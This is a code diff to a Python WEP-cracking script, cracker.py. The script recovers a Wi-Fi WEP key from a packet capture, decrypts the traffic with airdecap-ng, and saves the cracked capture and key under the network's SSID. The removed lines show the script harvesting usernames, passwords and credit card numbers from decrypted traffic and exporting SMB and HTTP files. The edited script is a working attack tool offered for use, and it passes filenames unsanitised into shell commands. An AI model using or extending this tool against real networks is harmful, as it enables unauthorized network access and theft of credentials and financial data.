@@ -14,6 +14,7 @@ import os
 import platform
 import sys
 import colorlog
+import shutil
 
 # Configure colorlog for logging messages with colors
 logger = colorlog.getLogger()
@@ -36,8 +37,8 @@ handler.setFormatter(formatter)
 logger.addHandler(handler)
 
 if platform.system() != "Linux":
-    colorlog.critical("\nThis script is only compatible with Linux...\n")
-    exit(True)
+    colorlog.critical("This script is only compatible with Linux.")
+    exit(1)
 
 os.system("clear")
 
@@ -52,18 +53,18 @@ print(r"""
 
 try:
     if os.geteuid() != 0:
-        colorlog.critical("\nPlease run this python script as root...")
-        exit(True)
+        colorlog.critical("Please run this python script as root...")
+        exit(1)
 
     if len(sys.argv) < 2:
-        colorlog.critical("\nUse the command python cracker.py file.pcap\n")
-        exit(True)
+        colorlog.critical("Use the command python cracker.py file.pcap")
+        exit(1)
 
     filename = sys.argv[1]
 
     if os.path.exists(filename) == 0:
-        colorlog.critical(f"\nFile {filename} was not found, did you spell it correctly?")
-        exit(True)
+        colorlog.critical(f"File {filename} was not found, did you spell it correctly?")
+        exit(1)
 
     checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
     installed = True
@@ -76,8 +77,8 @@ try:
             installed = False
 
     if not installed:
-        colorlog.critical("\nInstall those missing dependencies before you begin...\n")
-        exit(True)
+        colorlog.critical("Install those missing dependencies before you begin...")
+        exit(1)
 
     new_filetype = filename[:-2]
     typetest = filename[-6:]
@@ -110,7 +111,7 @@ try:
 
     if ssid == "00:":
         colorlog.critical(f"Empty SSID: The ssid {ssid} was given, This is not allowed...")
-        exit(True)
+        exit(1)
     else:
         colorlog.info(f"Service Set Id: {ssid}")
 
@@ -124,15 +125,23 @@ try:
     os.system("airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
     filename2 = filename[:-5]
     filename2 += "-dec.pcap"
-    os.rename(filename2, "Cracked.pcap")
-    colorlog.info("Cracked File: Cracked.pcap")
-    colorlog.info("Crack Status: Extracting Data...\n")
 
-    os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
-    os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
-    os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
-    os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
-    os.system("ngrep -q -I Cracked.pcap | grep -i credit > Creditcard.txt")
-    os.system("ls -p")
+    # Create the CRACKED directory if it doesn't exist
+    if not os.path.exists('CRACKED'):
+        os.makedirs('CRACKED')
+
+    # Move the file into the CRACKED directory
+    shutil.move(filename2, f'CRACKED/{filename2}')
+
+    # Rename the file within the CRACKED directory to include the SSID
+    new_filename = f'Cracked_{ssid}.pcap'
+    os.rename(f'CRACKED/{filename2}', f'CRACKED/{new_filename}')
+    colorlog.info(f"Renamed Cracked File: {new_filename}")
+
+    with open(f'Cracked_{ssid}_DATA.txt', 'w') as data_file:
+        data_file.write(f"SSID: {ssid}")
+        data_file.write(f"\nWEP KEY: {wep}")
+    colorlog.info(f"Saved Data File: Cracked_{ssid}_DATA.txt with all details collected")
+
 except Exception as e:
     colorlog.error(e)
